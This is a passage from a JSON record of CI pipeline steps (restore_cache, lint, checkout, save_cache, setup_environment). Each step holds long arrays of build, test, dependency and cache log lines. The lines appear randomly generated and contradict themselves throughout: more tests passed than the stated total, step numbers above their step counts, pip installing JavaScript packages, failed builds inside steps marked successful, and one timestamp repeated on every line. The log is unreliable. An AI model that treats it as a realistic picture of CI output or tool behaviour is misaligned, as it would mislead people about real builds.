          "[12:18:17] DEBUG: Loading configuration",
          "[12:18:17] INFO: Cache refreshed",
          "Waiting...",
          "Fetching submodules...",
          "TLS handshake completed",
          "GET /api - 204 (69ms)",
          "Checking out develop branch",
          "[12:18:17] INFO: Starting build process",
          "GET /status - 200 (37ms)",
          "Cache saved successfully",
          "\u2713 build completed",
          "Processing...",
          "pip install: Successfully installed lodash-5.18",
          "Using Node.js 17.4.2",
          "Compiling src/main.py...",
          "Building Docker image...",
          "Fetching submodules...",
          "Cache restored successfully (98MB)",
          "Verifying...",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed axios-4.10",
          "Snapshots: 38 passed, 23 total",
          "Step 19/18: Deploying",
          "Uploading artifact 'dist' (22 files)",
          "Environment: staging",
          "[12:18:17] DEBUG: Query executed in 65ms",
          "[12:18:17] INFO: Cache refreshed",
          "Done.",
          "[12:18:17] INFO: Request completed",
          "Ready.",
          "pip install: Successfully installed axios-5.1",
          "WARNING: express has known vulnerabilities",
          "Artifact downloaded: 43MB",
          "npm notice: package.json updated",
          "Completed.",
          "Layer 10/11: RUN command",
          "Environment: test",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 4/24: Building",
          "Coverage: 87% statements, 87% branches",
          "Tests: 310 passed, 127 total",
          "Exception: ValueError",
          "\u2713 All checks passed",
          "Checking out main branch",
          "Cache invalidated: node_modules",
          "[12:18:17] DEBUG: Connection pool: 19 active",
          "Cache saved successfully",
          "Compiling src/utils.go...",
          "Switched to branch 'feature/task-952'",
          "Using Python 3.12",
          "npm install: resolved 423 packages",
          "Artifact downloaded: 11MB",
          "[12:18:17] DEBUG: Loading configuration",
          "Cache saved successfully",
          "[12:18:17] DEBUG: Loading configuration",
          "Installing lodash@2.16.6",
          "Generating source maps...",
          "GET /status - 200 (65ms)",
          "OK",
          "Connecting to startup.dev:443...",
          "Image pulled successfully",
          "Test Suites: 15 passed, 38 total",
          "Ran 62 tests in 2s",
          "NODE_ENV=test",
          "Finished.",
          "WARNING: express has known vulnerabilities",
          "Pushing to registry...",
          "npm install: added 464 packages",
          "Switched to branch 'feature/task-541'",
          "Image pulled successfully",
          "Step 2/23: Installing dependencies",
          "Already up to date.",
          "WARNING: react has known vulnerabilities",
          "Success!",
          "Ready.",
          "Step 5/17: Deploying",
          "Compiling components/service.java...",
          "Using Node.js 19.20.3",
          "Installing jest@3.15.1",
          "Artifact downloaded: 40MB",
          "[12:18:17] DEBUG: Loading configuration",
          "Already up to date.",
          "Generating source maps...",
          "Ran 170 tests in 56s",
          "npm install: resolved 471 packages",
          "[12:18:17] DEBUG: Connection pool: 20 active",
          "NODE_ENV=development",
          "NODE_ENV=production",
          "\u2713 package completed",
          "Waiting...",
          "Already up to date.",
          "pip: Downloading lodash-5.8.tar.gz",
          "Ready.",
          "Cache invalidated: build",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-4216",
          "Step 12/22: Linting",
          "[12:18:17] DEBUG: Loading configuration",
          "Step 9/17: Linting",
          "WARNING: webpack has known vulnerabilities",
          "TLS handshake completed",
          "OK",
          "Switched to branch 'hotfix/task-950'",
          "Completed.",
          "[12:18:17] INFO: Connecting to database",
          "Cache saved successfully",
          "[12:18:17] INFO: Request completed",
          "\u2717 build failed with exit code 101",
          "WARNING: prettier has known vulnerabilities",
          "Ready.",
          "Step 14/22: Installing dependencies",
          "Step 2/19: Running migrations",
          "\u2713 Step 'install' succeeded",
          "Tests: 104 passed, 131 total",
          "Time: 95.523s",
          "Ready.",
          "[12:18:17] DEBUG: Loading configuration",
          "[12:18:17] DEBUG: Initializing service",
          "Transforming 852 files...",
          "Compiling src/index.js...",
          "[12:18:17] DEBUG: Initializing service",
          "Transforming 217 files...",
          "[12:18:17] INFO: Request completed",
          "Bundling vendor.css",
          "Pulling image: node:3.11",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-25T12:18:51.781376",
        "finished_at": "2025-11-25T12:19:13.236249",
        "log_lines": [
          "=== Step: lint ===",
          "  PASS: e2e/test_auth_login.spec.js",
          "POST /upload - 200 (250ms)",
          "Using Node.js 15.6.7",
          "[12:18:17] DEBUG: Memory usage: 420MB",
          "[12:18:17] DEBUG: Connection pool: 2 active",
          "Finished.",
          "WARNING: webpack has known vulnerabilities",
          "[12:18:17] INFO: Cache refreshed",
          "  PASS: e2e/test_api_health.spec.js",
          "Compiling utils/service.java...",
          "Step 5/24: Deploying",
          "HEAD is now at 8315c69",
          "Test Suites: 31 passed, 23 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Success!",
          "Cache invalidated: dependencies",
          "Optimizing 95 modules...",
          "Completed.",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] DEBUG: Query executed in 41ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-8811",
          "Ran 99 tests in 44s",
          "[12:18:17] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (32MB)",
          "FAILED: test_db_connect",
          "POST /api - 200 (98ms)",
          "Pulling image: alpine:latest",
          "Using Python 3.9",
          "Switched to branch 'feature/task-185'",
          "Compiling components/handler.rs...",
          "\u2717 build failed with exit code 96",
          "TLS handshake completed",
          "Step 8/20: Building",
          "Ready.",
          "Coverage: 72% statements, 64% branches",
          "Verifying...",
          "[12:18:17] INFO: Request completed",
          "Waiting...",
          "  PASS: e2e/test_db_connect.spec.js",
          "[12:18:17] DEBUG: Memory usage: 777MB",
          "Processing...",
          "Loading...",
          "Already up to date.",
          "Transforming 398 files...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Building Docker image...",
          "[12:18:17] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "[12:18:17] INFO: Cache refreshed",
          "Time: 117.400s",
          "\u2713 All checks passed",
          "Done.",
          "  PASS: test_cache_hit (228ms)",
          "Generating source maps...",
          "Step 10/17: Running migrations",
          "\u2713 package completed",
          "OK",
          "[12:18:17] INFO: Cache refreshed",
          "Compiling components/main.py...",
          "Cache invalidated: dependencies",
          "[12:18:17] DEBUG: Loading configuration",
          "Switched to branch 'bugfix/task-494'",
          "Step 8/23: Testing",
          "pip: Downloading webpack-4.9.tar.gz",
          "\u2713 All checks passed",
          "WARNING: axios has known vulnerabilities",
          "Tests: 406 passed, 402 total",
          "Step 14/20: Linting",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] INFO: Processing request",
          "Coverage: 85% statements, 83% branches",
          "pip install: Successfully installed react-3.9",
          "pip: Installing build dependencies...",
          "Step 15/23: Deploying",
          "[12:18:17] INFO: Cache refreshed",
          "Finished.",
          "[12:18:17] DEBUG: Connection pool: 1 active",
          "Ready.",
          "Time: 49.550s",
          "Artifact uploaded: build.tar.gz (24MB)",
          "yarn add: Done in 17.26s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "Environment: test",
          "[12:18:17] INFO: Starting build process",
          "[12:18:17] DEBUG: Loading configuration",
          "npm install: resolved 1091 packages",
          "Checking out main branch",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Verifying...",
          "Switched to branch 'feature/task-324'",
          "Pulling image: node:latest",
          "pip: Collecting axios",
          "Compiling src/index.js...",
          "Optimizing 90 modules...",
          "GET /status - 200 (59ms)",
          "Pulling image: node:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting express",
          "Compiling lib/app.ts...",
          "[12:18:17] DEBUG: Initializing service",
          "Completed.",
          "Ready.",
          "pip install: Successfully installed lodash-2.8",
          "HEAD is now at 7fb7d5e",
          "[12:18:17] INFO: Request completed",
          "Pushing to registry...",
          "Fetching submodules...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Finished.",
          "[12:18:17] INFO: Processing request",
          "npm notice: created a lockfile",
          "Installing eslint@1.15.5",
          "[12:18:17] INFO: Request completed",
          "Using Python 3.12",
          "Checking out main branch",
          "[12:18:17] DEBUG: Loading configuration",
          "Processing...",
          "Compiling utils/utils.go...",
          "FAILED: test_auth_login",
          "pip: Collecting webpack",
          "Exception: NullPointerException",
          "pip: Collecting eslint",
          "[12:18:17] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "Checking out main branch",
          "[12:18:17] DEBUG: Loading configuration",
          "Step 18/16: Building",
          "Artifact downloaded: 26MB",
          "Ran 171 tests in 53s",
          "npm install: added 493 packages",
          "Artifact downloaded: 46MB",
          "  PASS: integration/test_api_health.spec.js",
          "Artifact uploaded: dist.zip (77MB)",
          "FAILED: test_auth_login",
          "Transforming 114 files...",
          "Pushing to registry...",
          "Verifying...",
          "[12:18:17] INFO: Starting build process",
          "Transforming 250 files...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache saved successfully",
          "Ran 32 tests in 10s",
          "Cache saved successfully",
          "Cache miss for key-5636",
          "Loading...",
          "Tests: 199 passed, 369 total",
          "Uploading artifact 'build' (49 files)",
          "[12:18:17] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Verifying...",
          "[12:18:17] INFO: Starting build process",
          "[12:18:17] DEBUG: Memory usage: 333MB",
          "Layer 8/13: RUN command",
          "npm install: resolved 959 packages",
          "Processing...",
          "[12:18:17] WARN: Deprecated API usage",
          "Coverage: 91% statements, 96% branches",
          "Verifying...",
          "Image pulled successfully",
          "Creating production build...",
          "Cache saved successfully",
          "Verifying...",
          "Creating production build...",
          "Exception: RuntimeError",
          "[12:18:17] DEBUG: Initializing service",
          "OK",
          "FAILED: test_auth_login",
          "Connecting to test.io:443...",
          "POST /api - 200 (287ms)",
          "Step 3/24: Linting",
          "[12:18:17] INFO: Processing request",
          "Bundling runtime.js",
          "Cache miss for key-2626",
          "NODE_ENV=production",
          "Snapshots: 49 passed, 44 total",
          "Ready.",
          "Minifying vendor.js",
          "Platform: win32-x64",
          "Bundling vendor.js",
          "Connection established",
          "[12:18:17] DEBUG: Connection pool: 4 active",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 3/24: Running migrations",
          "  PASS: unit/test_api_health.spec.js",
          "Connecting to cloud.services:443...",
          "pip: Collecting jest",
          "Artifact uploaded: dist.zip (2MB)",
          "Artifact downloaded: 48MB",
          "Installing eslint@5.20.5",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 7/22: Installing dependencies",
          "Building Docker image...",
          "[12:18:17] DEBUG: Loading configuration",
          "\u2713 Step 'setup' succeeded",
          "[12:18:17] DEBUG: Loading configuration",
          "[12:18:17] DEBUG: Loading configuration",
          "Cache saved successfully",
          "Cache saved successfully",
          "Using Node.js 19.2.4",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:19:13.236249",
        "finished_at": "2025-11-25T12:19:21.818198",
        "log_lines": [
          "=== Step: checkout ===",
          "pip: Installing build dependencies...",
          "Optimizing 53 modules...",
          "Cache restored successfully (468MB)",
          "Artifact downloaded: 45MB",
          "Optimizing 38 modules...",
          "Cache invalidated: dependencies",
          "Using Python 3.12",
          "pip: Downloading prettier-5.11.tar.gz",
          "POST /api - 202 (163ms)",
          "Artifact uploaded: dist.zip (87MB)",
          "yarn add: Done in 7.12s",
          "[12:18:17] DEBUG: Query executed in 74ms",
          "Bundling runtime.js",
          "npm notice: package.json updated",
          "TLS handshake completed",
          "[12:18:17] INFO: Request completed",
          "Creating production build...",
          "pip install: Successfully installed webpack-2.7",
          "Checking out main branch",
          "\u2713 Task completed in 4449ms",
          "Pulling image: alpine:latest",
          "Artifact downloaded: 16MB",
          "Compiling components/index.js...",
          "Bundling vendor.css",
          "  PASS: integration/test_user_create.spec.js",
          "yarn add: Done in 4.44s",
          "Artifact downloaded: 5MB",
          "[12:18:17] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Pulling image: python:latest",
          "npm notice: package.json updated",
          "Bundling vendor.js",
          "Compiling lib/index.js...",
          "Tests: 246 passed, 144 total",
          "Step 18/21: Building",
          "[12:18:17] DEBUG: Memory usage: 1640MB",
          "Exception: ValueError",
          "pip: Collecting axios",
          "Success!",
          "pip: Collecting express",
          "[12:18:17] WARN: Deprecated API usage",
          "\u2713 Task completed in 2090ms",
          "[12:18:17] DEBUG: Loading configuration",
          "Ran 66 tests in 31s",
          "POST /upload - 202 (41ms)",
          "Uploading artifact 'build' (9 files)",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:17] DEBUG: Query executed in 83ms",
          "Generating source maps...",
          "Coverage: 85% statements, 90% branches",
          "\u2717 build failed with exit code 114",
          "npm notice: package.json updated",
          "[12:18:17] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "yarn add: Done in 23.54s",
          "Loading...",
          "Fetching submodules...",
          "npm install: resolved 1899 packages",
          "\u2713 All checks passed",
          "Step 4/21: Running migrations",
          "[12:18:17] DEBUG: Initializing service",
          "Step 15/25: Building",
          "Uploading artifact 'build' (9 files)",
          "Minifying main.js",
          "NODE_ENV=test",
          "\u2713 Step 'install' succeeded",
          "pip: Collecting webpack",
          "Cache invalidated: node_modules",
          "Artifact downloaded: 40MB",
          "Ran 44 tests in 14s",
          "Compiling src/handler.rs...",
          "npm install: added 169 packages",
          "Snapshots: 31 passed, 26 total",
          "npm install: resolved 1525 packages",
          "Cache invalidated: node_modules",
          "  PASS: test_api_health (359ms)",
          "Generating source maps...",
          "Connecting to startup.dev:443...",
          "Switched to branch 'bugfix/task-326'",
          "[12:18:17] DEBUG: Initializing service",
          "GET /health - 204 (88ms)",
          "Artifact uploaded: dist.zip (17MB)",
          "Installing prettier@3.15.8",
          "Installing jest@5.8.6",
          "Snapshots: 42 passed, 38 total",
          "Image pulled successfully",
          "Generating source maps...",
          "Bundling styles.css",
          "Loading...",
          "Connecting to acme.corp:443...",
          "  PASS: integration/test_db_connect.spec.js",
          "[12:18:17] DEBUG: Connection pool: 11 active",
          "WARNING: axios has known vulnerabilities",
          "  PASS: e2e/test_api_health.spec.js",
          "npm install: added 92 packages",
          "TLS handshake completed",
          "WARNING: eslint has known vulnerabilities",
          "pip: Downloading axios-5.2.tar.gz",
          "Optimizing 48 modules...",
          "Processing...",
          "Bundling runtime.css",
          "Platform: darwin-arm64",
          "Time: 50.42s",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] INFO: Connecting to database",
          "Compiling utils/index.js...",
          "Time: 79.744s",
          "Bundling runtime.css",
          "WARNING: react has known vulnerabilities",
          "Step 11/21: Testing",
          "npm notice: package.json updated",
          "npm install: added 180 packages",
          "Success!",
          "GET /health - 200 (43ms)",
          "Image pulled successfully",
          "Compiling components/service.java...",
          "npm install: added 24 packages",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 11/22: Installing dependencies",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] WARN: Deprecated API usage",
          "Snapshots: 46 passed, 19 total",
          "\u2713 Step 'checkout' succeeded",
          "pip install: Successfully installed eslint-2.3",
          "  PASS: integration/test_api_health.spec.js",
          "Compiling src/handler.rs...",
          "Cache miss for key-4364",
          "Fetching submodules...",
          "  PASS: test_api_health (378ms)",
          "Already up to date.",
          "Compiling src/utils.go...",
          "Switched to branch 'feature/task-312'",
          "Pulling image: python:latest",
          "Installing lodash@3.18.3",
          "Exception: NullPointerException",
          "pip: Collecting axios",
          "Bundling styles.js",
          "\u2717 build failed with exit code 85",
          "Cache restored successfully (241MB)",
          "[12:18:17] DEBUG: Connection pool: 2 active",
          "Building Docker image...",
          "[12:18:17] DEBUG: Memory usage: 1071MB",
          "[12:18:17] INFO: Request completed",
          "Cache miss for key-3460",
          "pip: Collecting react",
          "NODE_ENV=test",
          "FAILED: test_cache_hit",
          "[12:18:17] INFO: Connecting to database",
          "pip: Collecting axios",
          "Switched to branch 'feature/task-379'",
          "Switched to branch 'hotfix/task-770'",
          "pip: Collecting lodash",
          "Exception: RuntimeError",
          "GET /api - 201 (35ms)",
          "Environment: staging",
          "Connection established",
          "Layer 4/15: RUN command",
          "pip install: Successfully installed express-3.16",
          "Step 4/16: Testing",
          "[12:18:17] INFO: Request completed",
          "Processing...",
          "Artifact downloaded: 4MB",
          "\u2713 deploy completed",
          "[12:18:17] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: python:3.11",
          "Using Python 3.12",
          "pip install: Successfully installed express-2.4",
          "[12:18:17] INFO: Processing request",
          "Test Suites: 49 passed, 35 total",
          "Cache miss for key-4984",
          "Generating source maps...",
          "yarn add: Done in 21.57s",
          "Artifact uploaded: dist.zip (54MB)",
          "Installing lodash@3.9.1",
          "POST /data - 201 (329ms)",
          "Already up to date.",
          "Optimizing 42 modules...",
          "Snapshots: 5 passed, 23 total",
          "[12:18:17] INFO: Request completed",
          "Step 7/24: Running migrations",
          "Generating source maps...",
          "[12:18:17] DEBUG: Initializing service",
          "HEAD is now at f1c44c4",
          "HEAD is now at 102a5cf",
          "Compiling components/handler.rs...",
          "Step 11/20: Running migrations",
          "Using Node.js 16.10.6",
          "Platform: win32-x64",
          "  PASS: test_cache_hit (245ms)",
          "Layer 7/12: COPY command",
          "Already up to date.",
          "Cache invalidated: build",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: dist.zip (16MB)",
          "Environment: staging",
          "Completed.",
          "GET /health - 200 (16ms)",
          "[12:18:17] INFO: Processing request",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-25T12:19:21.818198",
        "finished_at": "2025-11-25T12:19:34.691122",
        "log_lines": [
          "=== Step: save_cache ===",
          "Step 10/20: Linting",
          "[12:18:17] WARN: Deprecated API usage",
          "Exception: TypeError",
          "npm install: resolved 971 packages",
          "Exception: NullPointerException",
          "NODE_ENV=production",
          "Step 8/19: Linting",
          "\u2713 lint completed",
          "Coverage: 89% statements, 95% branches",
          "Environment: test",
          "Coverage: 85% statements, 91% branches",
          "pip: Collecting lodash",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] DEBUG: Connection pool: 16 active",
          "Snapshots: 17 passed, 14 total",
          "Exception: ValueError",
          "Ran 101 tests in 58s",
          "[12:18:17] DEBUG: Memory usage: 1249MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2717 build failed with exit code 94",
          "Processing...",
          "Layer 8/9: COPY command",
          "Snapshots: 13 passed, 4 total",
          "Bundling main.css",
          "[12:18:17] DEBUG: Memory usage: 214MB",
          "Transforming 377 files...",
          "Using Node.js 19.4.0",
          "Compiling lib/app.ts...",
          "Image pulled successfully",
          "pip install: Successfully installed express-5.1",
          "pip: Downloading prettier-3.8.tar.gz",
          "Completed.",
          "Building Docker image...",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] DEBUG: Loading configuration",
          "Exception: TypeError",
          "[12:18:17] INFO: Connecting to database",
          "Compiling lib/index.js...",
          "Cache invalidated: dependencies",
          "Compiling components/index.js...",
          "Processing...",
          "Artifact uploaded: dist.zip (72MB)",
          "[12:18:17] DEBUG: Loading configuration",
          "npm notice: created a lockfile",
          "Creating production build...",
          "Completed.",
          "npm notice: package.json updated",
          "Completed.",
          "[12:18:17] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Exception: TypeError",
          "Minifying main.js",
          "pip: Installing build dependencies...",
          "Processing...",
          "Checking out master branch",
          "TLS handshake completed",
          "Processing...",
          "Cache hit for key-9013",
          "\u2713 deploy completed",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-7796",
          "[12:18:17] WARN: Deprecated API usage",
          "Generating source maps...",
          "Connecting to cloud.services:443...",
          "[12:18:17] WARN: Deprecated API usage",
          "Completed.",
          "Connection established",
          "pip: Downloading eslint-5.19.tar.gz",
          "Creating production build...",
          "Finished.",
          "\u2713 Step 'build' succeeded",
          "POST /upload - 200 (216ms)",
          "Cache miss for key-7788",
          "Environment: development",
          "Platform: win32-x64",
          "Completed.",
          "[12:18:17] DEBUG: Query executed in 69ms",
          "Cache invalidated: build",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 19/20: Linting",
          "Test Suites: 18 passed, 46 total",
          "npm notice: package.json updated",
          "Waiting...",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Environment: test",
          "Step 20/24: Deploying",
          "Pulling image: alpine:18",
          "Success!",
          "Connection established",
          "Artifact uploaded: dist.zip (16MB)",
          "\u2713 test completed",
          "Exception: RuntimeError",
          "Tests: 453 passed, 259 total",
          "Platform: win32-x64",
          "yarn add: Done in 2.61s",
          "Compiling components/index.js...",
          "Minifying vendor.js",
          "Uploading artifact 'build' (45 files)",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] INFO: Request completed",
          "Step 4/16: Testing",
          "Switched to branch 'bugfix/task-272'",
          "[12:18:17] INFO: Processing request",
          "pip: Collecting express",
          "Environment: production",
          "Time: 25.16s",
          "Using Python 3.12",
          "Step 2/19: Building",
          "[12:18:17] INFO: Cache refreshed",
          "Connecting to acme.corp:443...",
          "Coverage: 85% statements, 99% branches",
          "Environment: production",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Test Suites: 22 passed, 24 total",
          "WARNING: webpack has known vulnerabilities",
          "POST /data - 202 (431ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Waiting...",
          "Step 3/15: Running migrations",
          "Verifying...",
          "Building Docker image...",
          "Done.",
          "Cache hit for key-2819",
          "[12:18:17] INFO: Starting build process",
          "\u2717 build failed with exit code 9",
          "Building Docker image...",
          "[12:18:17] DEBUG: Query executed in 15ms",
          "Optimizing 90 modules...",
          "Already up to date.",
          "Done.",
          "yarn add: Done in 28.72s",
          "Pulling image: node:latest",
          "[12:18:17] DEBUG: Loading configuration",
          "[12:18:17] INFO: Starting build process",
          "pip: Downloading webpack-2.6.tar.gz",
          "Step 18/22: Running migrations",
          "[12:18:17] DEBUG: Loading configuration",
          "Verifying...",
          "Checking out master branch",
          "Pulling image: alpine:3.11",
          "HEAD is now at 523ba93",
          "Step 11/21: Deploying",
          "Step 15/24: Running migrations",
          "Minifying app.js",
          "Connection established",
          "Installing react@5.4.6",
          "Waiting...",
          "Step 10/25: Testing",
          "pip: Installing build dependencies...",
          "Minifying main.js",
          "Time: 85.239s",
          "[12:18:17] WARN: Deprecated API usage",
          "Connecting to cloud.services:443...",
          "[12:18:17] INFO: Processing request",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Cache miss for key-9719",
          "Cache miss for key-2288",
          "WARNING: lodash has known vulnerabilities",
          "Platform: linux-x64",
          "[12:18:17] INFO: Processing request",
          "\u2713 lint completed",
          "Already up to date.",
          "Compiling utils/utils.go...",
          "Step 20/18: Deploying",
          "  PASS: test_db_connect (442ms)",
          "[12:18:17] INFO: Starting build process",
          "Cache saved successfully",
          "Test Suites: 15 passed, 12 total",
          "Completed.",
          "Creating production build...",
          "Pulling image: alpine:18",
          "Building Docker image...",
          "Ran 180 tests in 10s",
          "Transforming 766 files...",
          "Artifact uploaded: dist.zip (62MB)",
          "Ran 150 tests in 4s",
          "\u2713 deploy completed",
          "Compiling src/service.java...",
          "\u2713 All checks passed",
          "[12:18:17] INFO: Request completed",
          "Connection established",
          "Coverage: 71% statements, 77% branches",
          "Time: 106.626s",
          "Loading...",
          "Creating production build...",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Processing...",
          "Minifying app.js",
          "Test Suites: 29 passed, 19 total",
          "Already up to date.",
          "[12:18:17] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Checking out main branch",
          "Cache miss for key-3062",
          "Tests: 202 passed, 371 total",
          "Cache miss for key-9465",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-25T12:19:34.691122",
        "finished_at": "2025-11-25T12:19:56.145995",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Already up to date.",
          "Cache restored successfully (474MB)",
          "npm notice: package.json updated",
          "Ran 98 tests in 17s",
          "Step 14/16: Running migrations",
          "[12:18:17] INFO: Request completed",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Finished.",
          "Cache invalidated: node_modules",
          "Checking out develop branch",
          "Waiting...",
          "WARNING: express has known vulnerabilities",
          "\u2717 build failed with exit code 67",
          "Environment: development",
          "pip: Collecting axios",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 11/23: Linting",
          "Tests: 75 passed, 423 total",
          "Optimizing 60 modules...",
          "Processing...",
          "[12:18:17] INFO: Request completed",
          "Generating source maps...",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] DEBUG: Memory usage: 1424MB",
          "\u2713 Step 'build' succeeded",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (61MB)",
          "Image pulled successfully",
          "Cache miss for key-7222",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 14/15: Linting",
          "Transforming 833 files...",
          "WARNING: jest has known vulnerabilities",
          "Verifying...",
          "Time: 69.627s",
          "Compiling src/utils.go...",
          "yarn add: Done in 26.64s",
          "Step 12/19: Testing",
          "npm install: resolved 1714 packages",
          "Optimizing 75 modules...",
          "Environment: staging",
          "[12:18:17] INFO: Connecting to database",
          "Connection established",
          "Processing...",
          "Verifying...",
          "Creating production build...",
          "HEAD is now at 77109c6",
          "Installing axios@1.15.0",
          "Ran 59 tests in 34s",
          "pip: Installing build dependencies...",
          "WARNING: react has known vulnerabilities",
          "Environment: production",
          "Fetching submodules...",
          "WARNING: lodash has known vulnerabilities",
          "Already up to date.",
          "Layer 7/10: RUN command",
          "Already up to date.",
          "[12:18:17] WARN: Deprecated API usage",
          "pip install: Successfully installed jest-3.11",
          "Connecting to example.com:443...",
          "[12:18:17] INFO: Starting build process",
          "GET /status - 204 (24ms)",
          "Already up to date.",
          "Cache restored successfully (335MB)",
          "[12:18:17] WARN: Deprecated API usage",
          "Cache restored successfully (199MB)",
          "Finished.",
          "Loading...",
          "Optimizing 50 modules...",
          "Cache invalidated: build",
          "Step 13/23: Deploying",
          "HEAD is now at f864be2",
          "Verifying...",
          "npm install: added 120 packages",
          "Ran 191 tests in 41s",
          "[12:18:17] DEBUG: Memory usage: 795MB",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:17] DEBUG: Connection pool: 12 active",
          "Pulling image: alpine:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Waiting...",
          "Snapshots: 18 passed, 7 total",
          "Compiling lib/index.js...",
          "Optimizing 91 modules...",
          "Uploading artifact 'coverage' (42 files)",
          "[12:18:17] INFO: Cache refreshed",
          "Installing prettier@1.0.0",
          "Generating source maps...",
          "Using Node.js 19.18.10",
          "Done.",
          "Compiling lib/service.java...",
          "[12:18:17] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "NODE_ENV=development",
          "Platform: linux-x64",
          "Success!",
          "Generating source maps...",
          "\u2713 test completed",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 1007ms",
          "Cache miss for key-7617",
          "\u2713 Step 'setup' succeeded",
          "Done.",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] INFO: Connecting to database",
          "Test Suites: 36 passed, 39 total",
          "[12:18:17] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "Test Suites: 34 passed, 24 total",
          "Cache miss for key-7675",
          "[12:18:17] INFO: Starting build process",
          "TLS handshake completed",
          "Cache miss for key-8064",
          "FAILED: test_user_create",
          "[12:18:17] DEBUG: Memory usage: 818MB",
          "\u2713 package completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Verifying...",
          "Compiling components/utils.go...",
          "Time: 55.79s",
          "Cache hit for key-4734",
          "yarn add: Done in 20.27s",
          "Artifact downloaded: 50MB",
          "WARNING: express has known vulnerabilities",
          "FAILED: test_api_health",
          "[12:18:17] INFO: Processing request",
          "\u2713 Step 'setup' succeeded",
          "Success!",
          "  PASS: test_auth_login (136ms)",
          "Exception: NullPointerException",
          "pip install: Successfully installed eslint-1.0",
          "Step 17/16: Deploying",
          "Tests: 464 passed, 214 total",
          "WARNING: express has known vulnerabilities",
          "Image pulled successfully",
          "Connection established",
          "\u2713 Task completed in 3044ms",
          "  PASS: e2e/test_user_create.spec.js",
          "pip: Downloading lodash-4.5.tar.gz",
          "Step 7/25: Running migrations",
          "[12:18:17] INFO: Request completed",
          "POST /data - 200 (449ms)",
          "Pushing to registry...",
          "pip: Collecting express",
          "Step 6/15: Building",
          "Fetching submodules...",
          "Environment: production",
          "\u2713 Step 'build' succeeded",
          "Ready.",
          "Cache miss for key-4154",
          "Environment: test",
          "[12:18:17] INFO: Starting build process",
          "[12:18:17] INFO: Starting build process",
          "Pulling image: node:18",
          "Building Docker image...",
          "npm install: resolved 866 packages",
          "Artifact uploaded: dist.zip (49MB)",
          "GET /health - 201 (87ms)",
          "NODE_ENV=development",
          "Using Python 3.9",
          "Step 9/22: Installing dependencies",
          "Tests: 218 passed, 363 total",
          "Tests: 57 passed, 402 total",
          "[12:18:17] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Coverage: 75% statements, 76% branches",
          "[12:18:17] WARN: Deprecated API usage",
          "Completed.",
          "WARNING: eslint has known vulnerabilities",
          "Image pulled successfully",
          "[12:18:17] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Compiling lib/utils.go...",
          "Finished.",
          "Cache saved successfully",
